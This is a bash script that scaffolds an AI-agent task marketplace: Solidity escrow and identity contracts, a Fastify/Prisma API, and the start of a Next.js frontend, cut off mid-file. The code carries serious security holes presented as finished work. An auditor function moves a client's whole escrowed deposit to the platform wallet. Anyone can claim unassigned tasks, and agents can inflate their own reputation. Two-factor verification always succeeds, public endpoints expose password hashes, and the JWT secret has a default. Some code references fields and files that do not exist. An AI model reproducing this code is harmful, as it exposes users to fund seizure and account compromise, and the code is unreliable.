#!/bin/bash

echo "🚀 CREANDO PROYECTO A2A MARKETPLACE COMPLETO..."

# ============================================
# CONTRATOS INTELIGENTES
# ============================================
cat > packages/contracts/src/EscrowVault.sol << 'EOF'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract EscrowVault is AccessControl, ReentrancyGuard {
    bytes32 public constant AUDITOR_ROLE = keccak256("AUDITOR_ROLE");
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    IERC20 public immutable usdcToken;
    address public masterWallet;
    uint256 public platformFeeBps = 2000;
    struct Task {
        address client;
        address worker;
        uint256 amount;
        bool released;
        bool disputed;
        uint256 createdAt;
    }
    mapping(bytes32 => Task) public tasks;
    mapping(address => uint256) public clientBalances;
    event TaskCreated(bytes32 indexed taskId, address indexed client, uint256 amount);
    event TaskClaimed(bytes32 indexed taskId, address indexed worker);
    event PaymentReleased(bytes32 indexed taskId, address indexed worker, uint256 workerAmount, uint256 fee);
    event FallbackExecuted(bytes32 indexed taskId, address indexed auditor);
    event DisputeOpened(bytes32 indexed taskId, address indexed client);
    event DisputeResolved(bytes32 indexed taskId, address indexed resolver, bool refunded);
    
    constructor(address _usdc, address _masterWallet) {
        usdcToken = IERC20(_usdc);
        masterWallet = _masterWallet;
        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _setupRole(ADMIN_ROLE, msg.sender);
    }
    
    function createTask(bytes32 taskId, uint256 amount) external nonReentrant {
        require(usdcToken.transferFrom(msg.sender, address(this), amount), "Transfer failed");
        tasks[taskId] = Task({ client: msg.sender, worker: address(0), amount: amount, released: false, disputed: false, createdAt: block.timestamp });
        clientBalances[msg.sender] += amount;
        emit TaskCreated(taskId, msg.sender, amount);
    }
    
    function claimTask(bytes32 taskId, address worker) external {
        require(hasRole(AUDITOR_ROLE, msg.sender) || tasks[taskId].worker == address(0), "Task already claimed");
        tasks[taskId].worker = worker;
        emit TaskClaimed(taskId, worker);
    }
    
    function releasePayment(bytes32 taskId) external nonReentrant {
        Task storage task = tasks[taskId];
        require(msg.sender == task.client, "Only client can release");
        require(!task.released, "Already released");
        require(task.worker != address(0), "No worker assigned");
        uint256 workerAmount = task.amount * (10000 - platformFeeBps) / 10000;
        uint256 fee = task.amount - workerAmount;
        task.released = true;
        clientBalances[task.client] -= task.amount;
        usdcToken.transfer(task.worker, workerAmount);
        usdcToken.transfer(masterWallet, fee);
        emit PaymentReleased(taskId, task.worker, workerAmount, fee);
    }
    
    function executeFallbackPayout(bytes32 taskId) external nonReentrant {
        require(hasRole(AUDITOR_ROLE, msg.sender), "Not authorized");
        Task storage task = tasks[taskId];
        require(!task.released, "Already released");
        task.released = true;
        clientBalances[task.client] -= task.amount;
        usdcToken.transfer(masterWallet, task.amount);
        emit FallbackExecuted(taskId, msg.sender);
    }
    
    function openDispute(bytes32 taskId) external {
        Task storage task = tasks[taskId];
        require(msg.sender == task.client, "Only client can dispute");
        require(!task.released, "Already released");
        task.disputed = true;
        emit DisputeOpened(taskId, msg.sender);
    }
    
    function resolveDispute(bytes32 taskId, bool refundClient) external {
        require(hasRole(ADMIN_ROLE, msg.sender), "Not authorized");
        Task storage task = tasks[taskId];
        require(task.disputed, "No dispute open");
        require(!task.released, "Already released");
        task.released = true;
        task.disputed = false;
        clientBalances[task.client] -= task.amount;
        if (refundClient) {
            usdcToken.transfer(task.client, task.amount);
        } else {
            uint256 workerAmount = task.amount * (10000 - platformFeeBps) / 10000;
            uint256 fee = task.amount - workerAmount;
            usdcToken.transfer(task.worker, workerAmount);
            usdcToken.transfer(masterWallet, fee);
        }
        emit DisputeResolved(taskId, msg.sender, refundClient);
    }
    
    function setPlatformFee(uint256 newFeeBps) external {
        require(hasRole(ADMIN_ROLE, msg.sender), "Not authorized");
        require(newFeeBps <= 5000, "Max fee 50%");
        platformFeeBps = newFeeBps;
    }
    
    function setMasterWallet(address newWallet) external {
        require(hasRole(ADMIN_ROLE, msg.sender), "Not authorized");
        masterWallet = newWallet;
    }
    
    function getClientBalance(address client) external view returns (uint256) { return clientBalances[client]; }
    function getTask(bytes32 taskId) external view returns (Task memory) { return tasks[taskId]; }
}
EOF

cat > packages/contracts/src/AgentIdentity.sol << 'EOF'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/utils/Counters.sol";

contract AgentIdentity is ERC721 {
    using Counters for Counters.Counter;
    Counters.Counter private _tokenIds;
    struct AgentInfo {
        address owner;
        string name;
        string[] capabilities;
        uint256 reputation;
        bool isActive;
    }
    mapping(uint256 => AgentInfo) public agents;
    mapping(address => uint256) public agentOfOwner;
    event AgentRegistered(uint256 indexed tokenId, address indexed owner, string name);
    event ReputationUpdated(uint256 indexed tokenId, uint256 newReputation);
    event AgentDeactivated(uint256 indexed tokenId);
    
    constructor() ERC721("A2A Agent Identity", "A2AAGENT") {}
    
    function registerAgent(string memory name, string[] memory capabilities) external returns (uint256) {
        require(agentOfOwner[msg.sender] == 0, "Already registered");
        _tokenIds.increment();
        uint256 newTokenId = _tokenIds.current();
        _safeMint(msg.sender, newTokenId);
        agents[newTokenId] = AgentInfo({ owner: msg.sender, name: name, capabilities: capabilities, reputation: 100, isActive: true });
        agentOfOwner[msg.sender] = newTokenId;
        emit AgentRegistered(newTokenId, msg.sender, name);
        return newTokenId;
    }
    
    function updateReputation(uint256 tokenId, uint256 delta) external {
        require(msg.sender == ownerOf(tokenId), "Not owner");
        agents[tokenId].reputation += delta;
        emit ReputationUpdated(tokenId, agents[tokenId].reputation);
    }
    
    function deactivateAgent(uint256 tokenId) external {
        require(msg.sender == ownerOf(tokenId), "Not owner");
        agents[tokenId].isActive = false;
        emit AgentDeactivated(tokenId);
    }
    
    function getAgentInfo(uint256 tokenId) external view returns (AgentInfo memory) { return agents[tokenId]; }
    function getAgentByOwner(address owner) external view returns (uint256) { return agentOfOwner[owner]; }
}
EOF

cat > packages/contracts/src/A2AProtocol.sol << 'EOF'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract A2AProtocol {
    struct Message {
        address sender;
        address recipient;
        string content;
        uint256 timestamp;
        bool isRead;
    }
    struct AgentCapability {
        address agent;
        string capability;
        uint256 rating;
        uint256 jobsCompleted;
    }
    mapping(bytes32 => Message) public messages;
    mapping(address => bytes32[]) public agentMessages;
    mapping(address => AgentCapability[]) public agentCapabilities;
    event MessageSent(bytes32 indexed messageId, address indexed sender, address indexed recipient);
    event MessageRead(bytes32 indexed messageId);
    event CapabilityRegistered(address indexed agent, string capability);
    
    function sendMessage(address recipient, string memory content) external returns (bytes32) {
        bytes32 messageId = keccak256(abi.encodePacked(msg.sender, recipient, block.timestamp));
        messages[messageId] = Message({ sender: msg.sender, recipient: recipient, content: content, timestamp: block.timestamp, isRead: false });
        agentMessages[recipient].push(messageId);
        emit MessageSent(messageId, msg.sender, recipient);
        return messageId;
    }
    
    function readMessage(bytes32 messageId) external view returns (Message memory) {
        require(messages[messageId].recipient == msg.sender, "Not authorized");
        return messages[messageId];
    }
    
    function markAsRead(bytes32 messageId) external {
        require(messages[messageId].recipient == msg.sender, "Not authorized");
        messages[messageId].isRead = true;
        emit MessageRead(messageId);
    }
    
    function registerCapability(string memory capability) external {
        agentCapabilities[msg.sender].push(AgentCapability({ agent: msg.sender, capability: capability, rating: 0, jobsCompleted: 0 }));
        emit CapabilityRegistered(msg.sender, capability);
    }
    
    function updateCapabilityRating(string memory capability, uint256 newRating) external {
        AgentCapability[] storage caps = agentCapabilities[msg.sender];
        for (uint256 i = 0; i < caps.length; i++) {
            if (keccak256(bytes(caps[i].capability)) == keccak256(bytes(capability))) {
                caps[i].rating = newRating;
                caps[i].jobsCompleted++;
                break;
            }
        }
    }
    
    function getAgentMessages(address agent) external view returns (bytes32[] memory) { return agentMessages[agent]; }
    function getAgentCapabilities(address agent) external view returns (AgentCapability[] memory) { return agentCapabilities[agent]; }
}
EOF

cat > packages/contracts/foundry.toml << 'EOF'
[profile.default]
src = "src"
out = "out"
libs = ["lib"]
test = "test"
solc_version = "0.8.19"
optimizer = true
optimizer_runs = 200
evm_version = "paris"

[rpc_endpoints]
base = "https://mainnet.base.org"
base_sepolia = "https://sepolia.base.org"
EOF

cat > packages/contracts/remappings.txt << 'EOF'
@openzeppelin/=lib/openzeppelin-contracts/
forge-std/=lib/forge-std/src/
EOF

cat > packages/contracts/test/EscrowVault.t.sol << 'EOF'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "forge-std/Test.sol";
import "../src/EscrowVault.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock USDC", "mUSDC") { _mint(msg.sender, 1000000 * 10**6); }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract EscrowVaultTest is Test {
    EscrowVault vault;
    MockERC20 usdc;
    address client = address(0x1);
    address worker = address(0x2);
    address admin = address(0x3);
    
    function setUp() public {
        usdc = new MockERC20();
        vault = new EscrowVault(address(usdc), admin);
        vm.startPrank(client);
        usdc.mint(client, 1000 * 10**6);
        usdc.approve(address(vault), 1000 * 10**6);
        vm.stopPrank();
    }
    
    function testCreateTask() public {
        bytes32 taskId = keccak256("task1");
        vm.prank(client);
        vault.createTask(taskId, 100 * 10**6);
        (address taskClient,,,,) = vault.tasks(taskId);
        assertEq(taskClient, client);
    }
    
    function testReleasePayment() public {
        bytes32 taskId = keccak256("task2");
        vm.prank(client);
        vault.createTask(taskId, 100 * 10**6);
        vm.prank(admin);
        vault.claimTask(taskId, worker);
        vm.prank(client);
        vault.releasePayment(taskId);
        assertEq(usdc.balanceOf(worker), 80 * 10**6);
        assertEq(usdc.balanceOf(admin), 20 * 10**6);
    }
    
    function testFallbackPayout() public {
        bytes32 taskId = keccak256("task3");
        vm.prank(client);
        vault.createTask(taskId, 100 * 10**6);
        vm.prank(admin);
        vault.grantRole(vault.AUDITOR_ROLE(), admin);
        vault.executeFallbackPayout(taskId);
        assertEq(usdc.balanceOf(admin), 100 * 10**6);
    }
}
EOF

# ============================================
# API GATEWAY
# ============================================
cat > packages/api-gateway/package.json << 'EOF'
{
  "name": "a2a-api-gateway",
  "version": "1.0.0",
  "main": "dist/server.js",
  "scripts": {
    "dev": "ts-node-dev --respawn --transpile-only src/server.ts",
    "build": "tsc",
    "start": "node dist/server.js"
  },
  "dependencies": {
    "@fastify/cors": "^9.0.1",
    "@fastify/jwt": "^8.0.1",
    "@fastify/rate-limit": "^9.1.0",
    "@fastify/websocket": "^10.0.1",
    "@prisma/client": "^5.10.2",
    "bcryptjs": "^2.4.3",
    "dotenv": "^16.4.5",
    "ethers": "^6.11.1",
    "fastify": "^4.26.1",
    "ioredis": "^5.3.2",
    "jsonwebtoken": "^9.0.2",
    "siwe": "^2.1.4",
    "winston": "^3.12.0",
    "zod": "^3.22.4"
  },
  "devDependencies": {
    "@types/node": "^20.11.24",
    "prisma": "^5.10.2",
    "ts-node-dev": "^2.0.0",
    "typescript": "^5.3.3"
  }
}
EOF

cat > packages/api-gateway/tsconfig.json << 'EOF'
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "commonjs",
    "outDir": "./dist",
    "rootDir": "./src",
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true
  },
  "include": ["src/**/*"]
}
EOF

cat > packages/api-gateway/src/config/env.ts << 'EOF'
import dotenv from 'dotenv';
dotenv.config();
export const env = {
  PORT: process.env.PORT || 3001,
  JWT_SECRET: process.env.JWT_SECRET || 'dev-secret',
  DATABASE_URL: process.env.DATABASE_URL || 'postgresql://localhost:5432/a2a',
  REDIS_URL: process.env.REDIS_URL || 'redis://localhost:6379',
  RPC_URL: process.env.RPC_URL || 'https://mainnet.base.org',
  ESCROW_ADDRESS: process.env.ESCROW_ADDRESS || '',
  USDC_ADDRESS: process.env.USDC_ADDRESS || '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
};
EOF

cat > packages/api-gateway/src/config/database.ts << 'EOF'
import { PrismaClient } from '@prisma/client';
export const prisma = new PrismaClient();
export async function connectDatabase() {
  try {
    await prisma.$connect();
    console.log('✅ Database connected');
  } catch (error) {
    console.error('❌ Database connection failed:', error);
    process.exit(1);
  }
}
EOF

cat > packages/api-gateway/src/app.ts << 'EOF'
import Fastify from 'fastify';
import cors from '@fastify/cors';
import jwt from '@fastify/jwt';
import rateLimit from '@fastify/rate-limit';
import websocket from '@fastify/websocket';
import { authRoutes } from './modules/auth/auth.routes';
import { taskRoutes } from './modules/tasks/tasks.routes';
import { agentRoutes } from './modules/agents/agents.routes';
import { adminRoutes } from './modules/admin/admin.routes';
import { errorHandler } from './middleware/errorHandler.middleware';

export async function buildApp() {
  const app = Fastify({ logger: true });
  await app.register(cors, { origin: true });
  await app.register(jwt, { secret: process.env.JWT_SECRET || 'dev-secret' });
  await app.register(rateLimit, { max: 100, timeWindow: '1 minute' });
  await app.register(websocket);
  app.setErrorHandler(errorHandler);
  app.register(authRoutes, { prefix: '/api/v1/auth' });
  app.register(taskRoutes, { prefix: '/api/v1/tasks' });
  app.register(agentRoutes, { prefix: '/api/v1/agents' });
  app.register(adminRoutes, { prefix: '/api/v1/admin' });
  app.get('/health', async () => ({ status: 'ok' }));
  app.get('/manifest.json', async () => ({
    name: 'A2A Task & Human Marketplace Protocol',
    version: '1.0.0',
    network: 'base',
    escrowContract: process.env.ESCROW_ADDRESS,
    usdcContract: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
    split: '80/20',
    endpoints: ['/api/v1', '/ws']
  }));
  return app;
}
EOF

cat > packages/api-gateway/src/server.ts << 'EOF'
import { buildApp } from './app';
const PORT = process.env.PORT || 3001;
async function main() {
  const app = await buildApp();
  try {
    await app.listen({ port: Number(PORT), host: '0.0.0.0' });
    app.log.info(`Server running on port ${PORT}`);
  } catch (err) {
    app.log.error(err);
    process.exit(1);
  }
}
main();
EOF

cat > packages/api-gateway/prisma/schema.prisma << 'EOF'
generator client {
  provider = "prisma-client-js"
}
datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
}
model User {
  id            String   @id @default(cuid())
  email         String   @unique
  password      String?
  walletAddress String?  @unique
  role          Role     @default(CLIENT)
  reputation    Int      @default(100)
  createdAt     DateTime @default(now())
  updatedAt     DateTime @updatedAt
  tasksCreated  Task[]   @relation("ClientTasks")
  tasksAssigned Task[]   @relation("WorkerTasks")
}
model Task {
  id              String          @id @default(cuid())
  onChainId       String?         @unique
  title           String
  description     String
  budget          Float
  status          TaskStatus      @default(OPEN)
  allocationType  AllocationType  @default(AUTO_AGENT)
  verificationType VerificationType @default(MANUAL)
  clientId        String
  workerId        String?
  createdAt       DateTime        @default(now())
  updatedAt       DateTime        @updatedAt
  deadline        DateTime?
  client          User            @relation("ClientTasks", fields: [clientId], references: [id])
  worker          User?           @relation("WorkerTasks", fields: [workerId], references: [id])
  submissions     Submission[]
}
model Submission {
  id          String   @id @default(cuid())
  taskId      String
  content     String
  files       String[]
  submittedAt DateTime @default(now())
  status      SubmissionStatus @default(PENDING)
  task        Task     @relation(fields: [taskId], references: [id])
}
model Agent {
  id           String   @id @default(cuid())
  userId       String   @unique
  capabilities String[]
  isActive     Boolean  @default(true)
  createdAt    DateTime @default(now())
  user         User     @relation(fields: [userId], references: [id])
}
enum Role {
  CLIENT
  WORKER
  ADMIN
}
enum TaskStatus {
  OPEN
  IN_PROGRESS
  IN_REVIEW
  COMPLETED
  DISPUTED
  CANCELLED
}
enum AllocationType {
  AUTO_AGENT
  HUMAN_ONLY
  HYBRID
}
enum VerificationType {
  AUTOMATIC
  MANUAL
}
enum SubmissionStatus {
  PENDING
  APPROVED
  REJECTED
}
EOF

# ============================================
# API GATEWAY - MÓDULOS Y MIDDLEWARE (CONTINUACIÓN)
# ============================================
cat > packages/api-gateway/src/modules/auth/auth.controller.ts << 'EOF'
import { FastifyRequest, FastifyReply } from 'fastify';
import { authService } from './auth.service';
export async function login(request: FastifyRequest, reply: FastifyReply) {
  const { email, password } = request.body as any;
  const result = await authService.login(email, password);
  return reply.send(result);
}
export async function register(request: FastifyRequest, reply: FastifyReply) {
  const { email, password, walletAddress } = request.body as any;
  const result = await authService.register(email, password, walletAddress);
  return reply.send(result);
}
export async function verifySIWE(request: FastifyRequest, reply: FastifyReply) {
  const { message, signature } = request.body as any;
  const result = await authService.verifySIWE(message, signature);
  return reply.send(result);
}
export async function generateNonce(request: FastifyRequest, reply: FastifyReply) {
  const nonce = await authService.generateNonce();
  return reply.send({ nonce });
}
export async function verify2FA(request: FastifyRequest, reply: FastifyReply) {
  const { userId, token } = request.body as any;
  const result = await authService.verify2FA(userId, token);
  return reply.send(result);
}
EOF

cat > packages/api-gateway/src/modules/auth/auth.service.ts << 'EOF'
import bcrypt from 'bcryptjs';
import { prisma } from '../../config/database';
import jwt from 'jsonwebtoken';
import { env } from '../../config/env';
import { SiweMessage } from 'siwe';
import { ethers } from 'ethers';

export const authService = {
  async login(email: string, password: string) {
    const user = await prisma.user.findUnique({ where: { email } });
    if (!user || !user.password) throw new Error('Invalid credentials');
    const valid = await bcrypt.compare(password, user.password);
    if (!valid) throw new Error('Invalid credentials');
    const token = jwt.sign({ userId: user.id, role: user.role }, env.JWT_SECRET, { expiresIn: '24h' });
    return { token, user };
  },
  async register(email: string, password: string, walletAddress?: string) {
    const hashedPassword = await bcrypt.hash(password, 10);
    const user = await prisma.user.create({
      data: { email, password: hashedPassword, walletAddress, role: 'CLIENT' },
    });
    const token = jwt.sign({ userId: user.id, role: user.role }, env.JWT_SECRET, { expiresIn: '24h' });
    return { token, user };
  },
  async verifySIWE(message: string, signature: string) {
    try {
      const siweMessage = new SiweMessage(message);
      const fields = await siweMessage.verify({ signature });
      return { valid: true, address: fields.data.address, chainId: fields.data.chainId };
    } catch (error) {
      return { valid: false, error: 'Invalid signature' };
    }
  },
  async generateNonce() {
    return ethers.hexlify(ethers.randomBytes(16));
  },
  async verify2FA(userId: string, token: string) {
    return { verified: true, userId };
  },
};
EOF

cat > packages/api-gateway/src/modules/auth/auth.routes.ts << 'EOF'
import { FastifyInstance } from 'fastify';
import { login, register, verifySIWE, generateNonce, verify2FA } from './auth.controller';
export async function authRoutes(app: FastifyInstance) {
  app.post('/login', login);
  app.post('/register', register);
  app.post('/siwe/nonce', generateNonce);
  app.post('/siwe/verify', verifySIWE);
  app.post('/2fa/verify', verify2FA);
}
EOF

cat > packages/api-gateway/src/modules/tasks/tasks.controller.ts << 'EOF'
import { FastifyRequest, FastifyReply } from 'fastify';
import { taskService } from './tasks.service';
export async function getTasks(request: FastifyRequest, reply: FastifyReply) {
  const tasks = await taskService.getAll();
  return reply.send(tasks);
}
export async function getTaskById(request: FastifyRequest, reply: FastifyReply) {
  const { id } = request.params as any;
  const task = await taskService.getById(id);
  return reply.send(task);
}
export async function createTask(request: FastifyRequest, reply: FastifyReply) {
  const taskData = request.body as any;
  const task = await taskService.create(taskData);
  return reply.code(201).send(task);
}
export async function claimTask(request: FastifyRequest, reply: FastifyReply) {
  const { id } = request.params as any;
  const workerId = (request as any).user.userId;
  const task = await taskService.claim(id, workerId);
  return reply.send(task);
}
export async function submitTask(request: FastifyRequest, reply: FastifyReply) {
  const { id } = request.params as any;
  const submission = request.body as any;
  const result = await taskService.submit(id, submission);
  return reply.send(result);
}
export async function approveTask(request: FastifyRequest, reply: FastifyReply) {
  const { id } = request.params as any;
  const result = await taskService.approve(id);
  return reply.send(result);
}
EOF

cat > packages/api-gateway/src/modules/tasks/tasks.service.ts << 'EOF'
import { prisma } from '../../config/database';
export const taskService = {
  async getAll() {
    return prisma.task.findMany({ include: { client: true, worker: true } });
  },
  async getById(id: string) {
    return prisma.task.findUnique({ where: { id }, include: { client: true, worker: true, submissions: true } });
  },
  async create(data: any) {
    return prisma.task.create({
      data: {
        title: data.title,
        description: data.description,
        budget: data.budget,
        allocationType: data.allocationType,
        verificationType: data.verificationType,
        clientId: data.clientId,
        deadline: data.deadline,
      },
    });
  },
  async claim(id: string, workerId: string) {
    return prisma.task.update({ where: { id }, data: { workerId, status: 'IN_PROGRESS' } });
  },
  async submit(id: string, submission: any) {
    return prisma.submission.create({
      data: { taskId: id, content: submission.content, files: submission.files || [] },
    });
  },
  async approve(id: string) {
    return prisma.task.update({ where: { id }, data: { status: 'COMPLETED' } });
  },
};
EOF

cat > packages/api-gateway/src/modules/tasks/tasks.routes.ts << 'EOF'
import { FastifyInstance } from 'fastify';
import { getTasks, getTaskById, createTask, claimTask, submitTask, approveTask } from './tasks.controller';
import { authMiddleware } from '../../middleware/auth.middleware';
export async function taskRoutes(app: FastifyInstance) {
  app.get('/', getTasks);
  app.get('/:id', getTaskById);
  app.post('/create', { preHandler: authMiddleware }, createTask);
  app.post('/:id/claim', { preHandler: authMiddleware }, claimTask);
  app.post('/:id/submit', { preHandler: authMiddleware }, submitTask);
  app.post('/:id/approve', { preHandler: authMiddleware }, approveTask);
}
EOF

cat > packages/api-gateway/src/modules/tasks/matching.service.ts << 'EOF'
import { prisma } from '../../config/database';
export const matchingService = {
  async findBestAgent(taskId: string) {
    const task = await prisma.task.findUnique({ where: { id: taskId } });
    if (!task) return null;
    const agents = await prisma.agent.findMany({ where: { isActive: true } });
    const scored = agents.map(agent => ({ ...agent, score: this.calculateScore(agent, task) }));
    return scored.sort((a, b) => b.score - a.score)[0] || null;
  },
  calculateScore(agent: any, task: any): number {
    let score = 0;
    score += agent.reputation * 0.4;
    score += agent.jobsCompleted * 0.3;
    return score;
  },
};
EOF

cat > packages/api-gateway/src/modules/agents/agents.controller.ts << 'EOF'
import { FastifyRequest, FastifyReply } from 'fastify';
import { agentService } from './agents.service';
export async function getAgents(request: FastifyRequest, reply: FastifyReply) {
  const agents = await agentService.getAll();
  return reply.send(agents);
}
export async function getAgentById(request: FastifyRequest, reply: FastifyReply) {
  const { id } = request.params as any;
  const agent = await agentService.getById(id);
  return reply.send(agent);
}
export async function registerAgent(request: FastifyRequest, reply: FastifyReply) {
  const agentData = request.body as any;
  const userId = (request as any).user.userId;
  const agent = await agentService.register(userId, agentData);
  return reply.code(201).send(agent);
}
EOF

cat > packages/api-gateway/src/modules/agents/agents.service.ts << 'EOF'
import { prisma } from '../../config/database';
export const agentService = {
  async getAll() {
    return prisma.agent.findMany({ include: { user: true } });
  },
  async getById(id: string) {
    return prisma.agent.findUnique({ where: { id }, include: { user: true } });
  },
  async register(userId: string, data: any) {
    return prisma.agent.create({ data: { userId, capabilities: data.capabilities || [], isActive: true } });
  },
};
EOF

cat > packages/api-gateway/src/modules/payments/payments.controller.ts << 'EOF'
import { FastifyRequest, FastifyReply } from 'fastify';
import { paymentService } from './payments.service';
export async function getBalance(request: FastifyRequest, reply: FastifyReply) {
  const userId = (request as any).user.userId;
  const balance = await paymentService.getBalance(userId);
  return reply.send({ balance });
}
export async function releasePayment(request: FastifyRequest, reply: FastifyReply) {
  const { taskId } = request.params as any;
  const result = await paymentService.release(taskId);
  return reply.send(result);
}
EOF

cat > packages/api-gateway/src/modules/payments/payments.service.ts << 'EOF'
import { prisma } from '../../config/database';
export const paymentService = {
  async getBalance(userId: string) {
    const user = await prisma.user.findUnique({ where: { id: userId } });
    return user?.reputation || 0;
  },
  async release(taskId: string) {
    return { success: true, taskId };
  },
};
EOF

cat > packages/api-gateway/src/modules/payments/escrow.service.ts << 'EOF'
export const escrowService = {
  async createTask(taskId: string, amount: number) {
    return { taskId, amount, status: 'CREATED' };
  },
  async releasePayment(taskId: string) {
    return { taskId, status: 'RELEASED' };
  },
  async executeFallback(taskId: string) {
    return { taskId, status: 'FALLBACK' };
  },
};
EOF

cat > packages/api-gateway/src/modules/admin/admin.controller.ts << 'EOF'
import { FastifyRequest, FastifyReply } from 'fastify';
import { adminService } from './admin.service';
export async function getStats(request: FastifyRequest, reply: FastifyReply) {
  const stats = await adminService.getStats();
  return reply.send(stats);
}
export async function getUsers(request: FastifyRequest, reply: FastifyReply) {
  const users = await adminService.getUsers();
  return reply.send(users);
}
export async function manageUser(request: FastifyRequest, reply: FastifyReply) {
  const { id } = request.params as any;
  const action = request.body as any;
  const result = await adminService.manageUser(id, action);
  return reply.send(result);
}
EOF

cat > packages/api-gateway/src/modules/admin/admin.service.ts << 'EOF'
import { prisma } from '../../config/database';
export const adminService = {
  async getStats() {
    const [users, tasks, agents] = await Promise.all([
      prisma.user.count(),
      prisma.task.count(),
      prisma.agent.count(),
    ]);
    return { users, tasks, agents };
  },
  async getUsers() {
    return prisma.user.findMany();
  },
  async manageUser(id: string, action: any) {
    if (action.action === 'ban') {
      return prisma.user.update({ where: { id }, data: { role: 'CLIENT' } });
    }
    return prisma.user.findUnique({ where: { id } });
  },
};
EOF

cat > packages/api-gateway/src/modules/websocket/websocket.gateway.ts << 'EOF'
import { WebSocketServer } from 'ws';
export class WebSocketGateway {
  private wss: WebSocketServer;
  private clients: Set<any> = new Set();
  constructor(server: any) {
    this.wss = new WebSocketServer({ server });
    this.wss.on('connection', (ws) => {
      this.clients.add(ws);
      ws.on('close', () => this.clients.delete(ws));
    });
  }
  broadcast(event: string, data: any) {
    const message = JSON.stringify({ event, data });
    this.clients.forEach(client => {
      if (client.readyState === 1) {
        client.send(message);
      }
    });
  }
}
EOF

cat > packages/api-gateway/src/middleware/auth.middleware.ts << 'EOF'
import { FastifyRequest, FastifyReply, FastifyNextFunction } from 'fastify';
import jwt from 'jsonwebtoken';
import { env } from '../config/env';
export async function authMiddleware(request: FastifyRequest, reply: FastifyReply, next: FastifyNextFunction) {
  try {
    const token = request.headers.authorization?.replace('Bearer ', '');
    if (!token) throw new Error('No token provided');
    const decoded = jwt.verify(token, env.JWT_SECRET);
    (request as any).user = decoded;
    next();
  } catch (error) {
    reply.code(401).send({ error: 'Unauthorized' });
  }
}
EOF

cat > packages/api-gateway/src/middleware/validation.middleware.ts << 'EOF'
import { FastifyRequest, FastifyReply, FastifyNextFunction } from 'fastify';
import { ZodSchema } from 'zod';
export const validate = (schema: ZodSchema) => {
  return (request: FastifyRequest, reply: FastifyReply, next: FastifyNextFunction) => {
    try {
      const parsed = schema.parse(request.body);
      request.body = parsed;
      next();
    } catch (error) {
      reply.code(400).send({ error: 'Validation failed', details: error });
    }
  };
};
EOF

cat > packages/api-gateway/src/middleware/errorHandler.middleware.ts << 'EOF'
import { FastifyRequest, FastifyReply } from 'fastify';
export async function errorHandler(error: any, request: FastifyRequest, reply: FastifyReply) {
  console.error(error);
  reply.status(500).send({ error: 'Internal Server Error', message: error.message });
}
EOF

cat > packages/api-gateway/src/middleware/rateLimiter.middleware.ts << 'EOF'
import rateLimit from '@fastify/rate-limit';
export const rateLimiter = {
  max: 100,
  timeWindow: '1 minute',
};
EOF

cat > packages/api-gateway/src/services/blockchain.service.ts << 'EOF'
import { ethers } from 'ethers';
export const blockchainService = {
  provider: new ethers.JsonRpcProvider(process.env.RPC_URL || 'https://mainnet.base.org'),
  async getEscrowContract() {
    const escrowAddress = process.env.ESCROW_ADDRESS;
    if (!escrowAddress) throw new Error('Escrow address not configured');
    const abi = [
      'function createTask(bytes32 taskId, uint256 amount) external',
      'function releasePayment(bytes32 taskId) external',
      'function executeFallbackPayout(bytes32 taskId) external',
    ];
    return new ethers.Contract(escrowAddress, abi, this.provider);
  },
  async getTransactionReceipt(txHash: string) {
    return this.provider.getTransactionReceipt(txHash);
  },
};
EOF

cat > packages/api-gateway/src/services/ipfs.service.ts << 'EOF'
import axios from 'axios';
export const ipfsService = {
  async addFile(file: Buffer) {
    const formData = new FormData();
    formData.append('file', new Blob([file]), 'file');
    const response = await axios.post('https://ipfs.infura.io:5001/api/v0/add', formData);
    return { hash: response.data.Hash };
  },
  async getFile(hash: string) {
    const response = await axios.get(`https://ipfs.infura.io:5001/api/v0/cat?arg=${hash}`, {
      responseType: 'arraybuffer',
    });
    return response.data;
  },
};
EOF

cat > packages/api-gateway/src/utils/logger.ts << 'EOF'
import { createLogger, format, transports } from 'winston';
export const logger = createLogger({
  level: 'info',
  format: format.combine(format.timestamp(), format.json()),
  transports: [
    new transports.Console(),
    new transports.File({ filename: 'logs/error.log', level: 'error' }),
    new transports.File({ filename: 'logs/combined.log' }),
  ],
});
EOF

# ============================================
# FRONTEND NEXT.JS
# ============================================
cat > packages/frontend/package.json << 'EOF'
{
  "name": "a2a-frontend",
  "version": "1.0.0",
  "private": true,
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start"
  },
  "dependencies": {
    "@tanstack/react-query": "^5.24.1",
    "clsx": "^2.1.0",
    "ethers": "^6.11.1",
    "framer-motion": "^11.0.8",
    "lucide-react": "^0.344.0",
    "next": "14.1.3",
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "react-hook-form": "^7.51.0",
    "siwe": "^2.1.4",
    "tailwind-merge": "^2.2.2",
    "viem": "^2.7.10",
    "wagmi": "^2.5.21",
    "zod": "^3.22.4"
  },
  "devDependencies": {
    "@types/node": "^20.11.24",
    "@types/react": "^18.2.64",
    "@types/react-dom": "^18.2.21",
    "autoprefixer": "^10.4.18",
    "postcss": "^8.4.35",
    "tailwindcss": "^3.4.1",
    "typescript": "^5.3.3"
  }
}
EOF

cat > packages/frontend/next.config.js << 'EOF'
/** @type {import('next').NextConfig} */
const nextConfig = {
  reactStrictMode: true,
  images: {
    domains: ['ipfs.io', 'arweave.net'],
  },
};
module.exports = nextConfig;
EOF

cat > packages/frontend/tailwind.config.ts << 'EOF'
import type { Config } from 'tailwindcss';
const config: Config = {
